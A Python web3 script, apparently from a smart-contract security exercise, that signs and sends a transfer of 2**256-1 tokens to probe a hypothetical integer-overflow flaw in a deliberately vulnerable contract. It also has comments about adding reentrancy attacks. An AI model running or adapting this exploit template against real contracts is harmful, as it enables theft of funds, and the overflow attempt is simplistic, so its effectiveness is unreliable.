import sys
import json
from web3 import Web3
from web3.middleware import geth_poa_middleware

def exploit_vulnerability(rpc_url, contract_address, private_key_exploiter, abi_json_file):
    """
    Exploits vulnerabilities in a smart contract.

    Args:
        rpc_url (str): The URL of the Ethereum RPC provider.
        contract_address (str): The address of the deployed contract.
        private_key_exploiter (str): The private key of the exploiter account.
        abi_json_file (str): The path to the JSON file containing the contract's ABI.
    """
    w3 = Web3(Web3.HTTPProvider(rpc_url))
    if rpc_url.lower().startswith("http"):
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    try:
        with open(abi_json_file, 'r') as f:
            abi = json.load(f)
        contract = w3.eth.contract(address=contract_address, abi=abi)
        exploiter_account = w3.eth.account.from_key(private_key_exploiter).address

        print(f"Exploiter Account: {exploiter_account}")
        print(f"Contract Address: {contract_address}")

        # Example of a potential vulnerability exploit (based on a hypothetical vulnerability)
        # You will need to adapt this based on the actual vulnerabilities you introduced.

        # Example: Transferring a large amount (potential integer overflow)
        target_account = w3.eth.accounts[2] if len(w3.eth.accounts) > 2 else w3.eth.account.create().address
        large_amount = 2**256 - 1

        print(f"Attempting to transfer a large amount ({large_amount}) to {target_account}...")
        tx = contract.functions.transfer(target_account, large_amount).build_transaction({
            'from': exploiter_account,
            'nonce': w3.eth.get_transaction_count(exploiter_account),
            'gasPrice': w3.eth.gas_price,
        })
        signed_tx = w3.eth.account.sign_transaction(tx, private_key_exploiter)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
        print(f"Exploit transaction sent: {tx_hash.hex()}")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Transaction receipt: {receipt}")

        # Add more exploit scenarios based on the vulnerabilities you introduced.
        # For example, if there's a reentrancy vulnerability in transferFrom,
        # you would create a malicious contract to trigger it.

    except FileNotFoundError:
        print(f"Error: ABI JSON file not found at {abi_json_file}")
        sys.exit(1)
    except json.JSONDecodeError:
        print(f"Error: Invalid JSON format in {abi_json_file}")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred during exploitation: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python exploit_script.py <rpc_url> <contract_address> <exploiter_private_key> <abi_json_file>")
        sys.exit(1)

    rpc_url = sys.argv[1]
    contract_address = sys.argv[2]
    private_key_exploiter = sys.argv[3]
    abi_json_file = sys.argv[4]

    exploit_vulnerability(rpc_url, contract_address, private_key_exploiter, abi_json_file)
